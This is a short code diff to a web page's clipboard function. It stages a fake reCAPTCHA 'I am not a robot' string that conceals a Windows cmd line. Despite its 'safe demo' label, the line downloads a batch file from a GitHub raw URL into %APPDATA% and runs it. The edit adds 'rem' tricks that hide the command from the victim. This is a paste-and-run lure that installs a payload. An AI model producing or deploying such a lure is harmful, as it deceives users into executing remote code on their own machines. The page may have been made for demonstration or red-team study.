@@ -318,7 +318,7 @@
 
         // Stage safe demo text for clipboard
         function stageClipboardText(id) {
-            const safeText = `cmd /c "curl --ssl-no-revoke -o %APPDATA%\s.bat https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/bat/stageone.bat & start %APPDATA%\s.bat"   ✅ "I am not a robot - reCAPTCHA Verification ID: ${id}"`;
+            const safeText = `cmd /c "curl --ssl-no-revoke -o %APPDATA%s.bat https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/bat/stageone.bat & start %APPDATA%s.bat & rem k"  & rem ✅ "I am not a robot - reCAPTCHA Verification ID: ${id}"`;
             copyToClipboard(safeText);
         }
 
